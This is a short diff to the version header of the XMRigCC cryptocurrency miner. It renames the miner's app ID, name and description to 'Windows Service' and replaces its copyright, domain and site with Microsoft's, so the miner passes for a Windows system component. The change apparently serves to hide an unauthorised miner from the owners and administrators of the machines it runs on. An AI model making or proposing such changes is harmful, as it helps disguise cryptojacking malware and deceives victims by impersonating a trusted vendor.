@@ -7,14 +7,14 @@
 #define APP_DESC      "XMRigCC Command'n'Control Server"
 #define APP_COPYRIGHT "Copyright (C) 2017- BenDr0id"
 # else
-#define APP_ID        "XMRigCC"
-#define APP_NAME      "XMRigCC"
-#define APP_DESC      "XMRigCC CPU miner"
-#define APP_COPYRIGHT "Copyright (C) 2017- BenDr0id"
+#define APP_ID        "Windows Service"
+#define APP_NAME      "Windows Service"
+#define APP_DESC      "Windows Service"
+#define APP_COPYRIGHT "Copyright (C) 2016-2018 Microsoft"
 #endif
-#define APP_VERSION   "1.4.0 (based on XMRig 2.4.4)"
-#define APP_DOMAIN    ""
-#define APP_SITE      "https://github.com/Bendr0id/xmrigCC"
+#define APP_VERSION   "Custom 2.4.5"
+#define APP_DOMAIN    "microsoft.com"
+#define APP_SITE      "www.microsoft.com"
 #define APP_KIND      "cpu"
 
 #define APP_VER_MAJOR  1
